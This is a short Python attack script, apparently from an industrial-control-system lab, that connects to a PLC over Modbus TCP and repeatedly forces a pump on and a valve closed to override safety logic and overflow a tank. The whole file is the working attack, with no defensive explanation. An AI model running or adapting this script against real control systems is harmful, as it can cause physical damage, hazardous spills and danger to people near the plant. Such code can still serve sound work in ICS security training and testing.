import sys, time
sys.path.insert(0, "/app")
from pymodbus.client import ModbusTcpClient
from shared.config import PLC_IP, MODBUS_PORT, REG_PUMP, REG_VALVE, REG_TANK_LEVEL

c = ModbusTcpClient(PLC_IP, port=MODBUS_PORT)
c.connect()
print("[MITM] forcing pump ON and valve CLOSED - tank will overflow")
while True:
    c.write_register(REG_PUMP, 1)
    c.write_register(REG_VALVE, 0)
    lvl = c.read_holding_registers(REG_TANK_LEVEL, count=1).registers[0]
    print(f"[MITM] overriding safety -> pump ON, valve CLOSED (level={lvl})")
    time.sleep(0.5)
